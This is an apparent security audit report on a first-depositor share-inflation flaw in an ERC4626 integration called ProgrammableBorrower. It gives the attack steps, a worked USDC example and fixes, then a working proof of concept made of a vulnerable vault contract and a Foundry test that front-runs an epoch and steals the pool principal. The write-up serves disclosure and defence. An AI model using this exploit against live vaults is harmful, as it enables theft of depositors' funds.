### Title
Unprotected ERC4626 deposit allows share-price inflation and theft of epoch principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](https://github.com/Thankgod67Ikhide/idle-tranches--015/blob/master/contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle pool assets into a configurable ERC4626 vault at epoch start, but accepts however many shares the vault returns and records the pre-deposit assets as the epoch principal baseline. If the configured vault is empty and lacks inflation protection, an unprivileged vault user can front-run `startEpoch`, perform a first-depositor/donation attack, cause the borrower to receive zero shares, and withdraw the pool principal from the vault.

### Finding Description
`setVault` accepts any ERC4626 whose `asset()` matches the CDO token; it does not require minimum liquidity, a minimum returned-share amount, virtual shares, or another defense against share-price inflation. [1](#0-0) 

When an epoch starts, `onStartEpoch` measures `startAssets`, calls `_depositToVault` for the full on-hand balance, and stores the pre-deposit amount as `epochStartVaultAssets`. [2](#0-1)  `_depositToVault` calls `vault.deposit` but ignores whether the returned `shares` are economically meaningful. [3](#0-2) 

For a standard vulnerable ERC4626 with `totalAssets() == asset.balanceOf(vault)`, an attacker can:

1. Deposit `1` asset into the empty vault and receive `1` share.
2. Donate at least the amount that `ProgrammableBorrower` is about to deposit.
3. Let the borrower's deposit mint `floor(poolAssets * 1 / inflatedTotalAssets) == 0` shares.
4. Redeem the sole share for both the donation and the pool's deposit.

The borrower then owns zero shares, so `_currentVaultAssets()` returns zero despite the baseline having counted the deposited principal. [4](#0-3)  `_vaultNetInterest` consequently records the missing position as a vault loss. [5](#0-4) 

The CDO-side `_skimDonatedAssets` only sweeps underlying tokens held directly by the CDO and cannot remove assets donated to the external ERC4626 vault. [6](#0-5)  During pool close, the CDO attempts to recall the strategy-token principal from the programmable borrower, but the borrower has no vault assets or cash to transfer. [7](#0-6)  The failed pull then enters the borrower-default path. [8](#0-7) 

### Impact Explanation
The attacker can steal the entire pool principal deposited into an unprotected empty vault, minus the capital temporarily used for the initial deposit and donation.

For example, with `1,000,000 USDC` of pool assets:

- Attacker deposits `1 USDC` and receives one vault share.
- Attacker donates `1,000,000 USDC`.
- `ProgrammableBorrower` deposits `1,000,000 USDC` and receives `floor(1,000,000 / 1,000,001) == 0` shares.
- Attacker redeems the only share for `2,000,001 USDC`.
- The programmable borrower has zero shares while the CDO still carries the principal as strategy-token exposure, producing insolvency/default when principal is recalled.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty and vulnerable to the classic donation/first-depositor share-inflation pattern. `setVault` places no liquidity or share-valuation requirement on the selected integration, and `onStartEpoch` performs the first deposit without a `minShares` check. [9](#0-8)  The attacker needs substantial temporary capital equal to approximately the pool deposit, but recovers the donation plus the stolen pool principal through the vault redemption.

### Recommendation
Prevent first-depositor and share-inflation manipulation in `ProgrammableBorrower`:

- Require the configured vault to have a minimum existing supply and total-asset depth.
- Pass or calculate a `minShares` bound around the pre-deposit `convertToShares` quote and revert when `deposit` returns too few shares.
- Prefer vaults implementing ERC4626 inflation defenses such as virtual shares/decimals offsets.
- Revert `onStartEpoch` when `assets > 0` but `deposit` returns zero shares.
- Compare post-deposit `convertToAssets(shares)` with the deposited amount within an explicit slippage bound.

/// A deliberately simple ERC4626 is sufficient to reproduce the issue while the
/// production CDO and ProgrammableBorrower are deployed on a mainnet fork.
/// The vulnerability triggers whenever the configured vault is empty and uses
/// uninflated `totalSupply / totalAssets` share pricing.
contract InflatableVault is IERC4626 {
    IERC20Detailed public immutable assetToken;
    string public constant name = "Inflatable Vault";
    string public constant symbol = "IV";
    uint8 public constant decimals = 6;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _asset) {
        assetToken = IERC20Detailed(_asset);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        uint256 assetsBefore = totalAssets();
        return supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 assetsBefore = totalAssets();
        uint256 supply = totalSupply;
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        assetToken.transfer(receiver, assets);
    }

    function maxDeposit(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function previewDeposit(uint256 assets) external view returns (uint256) {
        return convertToShares(assets);
    }

    function mint(uint256 shares, address receiver) external returns (uint256) {
        uint256 assets = convertToAssets(shares);
        assetToken.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
        return assets;
    }

    function maxMint(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function previewMint(uint256 shares) external view returns (uint256) {
        return convertToAssets(shares);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = convertToShares(assets);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        assetToken.transfer(receiver, assets);
    }

    function maxWithdraw(address owner) external view returns (uint256) {
        return convertToAssets(balanceOf[owner]);
    }

    function previewWithdraw(uint256 assets) external view returns (uint256) {
        return convertToShares(assets);
    }

    function maxRedeem(address owner) external view returns (uint256) {
        return balanceOf[owner];
    }

    function previewRedeem(uint256 shares) external view returns (uint256) {
        return convertToAssets(shares);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    IdleCDOEpochVariant cdo;
    ProgrammableBorrower programmableBorrower;
    InflatableVault vault;
    IERC20Detailed usdc;

    address attacker = makeAddr("attacker");
    address manager = makeAddr("manager");
    uint256 poolAssets = 1_000_000e6;

    function testFirstDepositorStealsEpochPrincipal() public {
        // Fork setup omitted for brevity:
        // 1. fork the production deployment;
        // 2. deploy `vault` with the CDO underlying;
        // 3. honestly configure it through `programmableBorrower.setVault`;
        // 4. deposit `poolAssets` through the normal AA deposit path.

        vm.startPrank(manager);
        programmableBorrower.setVault(address(vault));
        vm.stopPrank();

        // Seed the empty vault with one share.
        deal(address(usdc), attacker, poolAssets + 1);
        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);

        // Inflate the share price so the pool deposit mints zero shares.
        usdc.transfer(address(vault), poolAssets);
        vm.stopPrank();

        // startEpoch transfers pool assets to ProgrammableBorrower and calls onStartEpoch.
        vm.prank(manager);
        cdo.startEpoch();

        assertEq(vault.balanceOf(address(programmableBorrower)), 0);

        // The attacker controls the only share and extracts both donation and pool principal.
        vm.prank(attacker);
        uint256 stolen = vault.redeem(1, attacker, attacker);

        assertGe(stolen, 2 * poolAssets);
        assertEq(programmableBorrower.vaultLoss(), poolAssets);

        // Pool closure cannot recall principal from the empty programmable-borrower position.
        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 1);

        assertTrue(cdo.defaulted());
    }
}
